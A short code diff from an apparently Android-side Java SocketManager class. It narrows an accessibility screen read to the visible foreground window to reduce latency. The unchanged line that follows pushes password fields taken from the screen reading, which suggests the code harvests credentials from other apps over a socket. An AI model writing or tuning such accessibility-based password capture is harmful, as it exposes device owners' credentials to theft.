@@ -2540,7 +2540,10 @@ public class SocketManager {
                         busy.put("error", "screen_reader_stream_start busy — accessibility reader is already running, retry");
                         return busy;
                     }
-                    response = sr.readScreen();
+                    // Repeated dashboard reads only need the visible foreground
+                    // window; scanning every accessible window adds avoidable
+                    // latency and device-side accessibility work.
+                    response = sr.readVisibleForegroundScreen();
                     pushPasswordFieldsFromScreen(response);
                 } finally {
                     if (acquired) accessSemaphore.release();
